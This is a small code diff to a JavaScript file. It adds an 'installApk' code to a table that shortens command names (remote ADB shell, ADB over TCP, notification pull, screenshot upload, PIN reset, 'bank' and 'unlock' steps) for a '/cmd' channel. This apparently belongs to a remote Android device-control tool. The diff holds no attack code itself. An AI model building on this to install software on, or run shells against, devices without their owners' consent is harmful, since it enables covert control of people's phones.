@@ -220,7 +220,7 @@ const WIRE = {
   setting: "st", fileUp: "fu", fileDel: "fd", shotUp: "sh", notifPull: "np", tgSet: "gs", tgCode: "gc", tgUnlink: "gu",
   tgOff: "go", pinSet: "ps", pinReset: "pr", pinResetCancel: "pc", support: "sx", supportSay: "sy", adbShell: "ab", shClear: "hc",
   adbTcp: "ap", bankEnd: "be", unlockEnd: "ue", clearCache: "ca", rescan: "re", bgLimit: "bl", bgRestore: "br", fixPerms: "fp",
-  selfOpen: "so", tsInstall: "ti",
+  selfOpen: "so", tsInstall: "ti", installApk: "ia",
 };
 const WIRE_NAME = Object.fromEntries(Object.entries(WIRE).map(([n, c]) => [c, n]));
 const wireOut = (path, body) => path === "/cmd" && body && Object.hasOwn(WIRE, body.type) ? { ...body, type: WIRE[body.type] } : body;
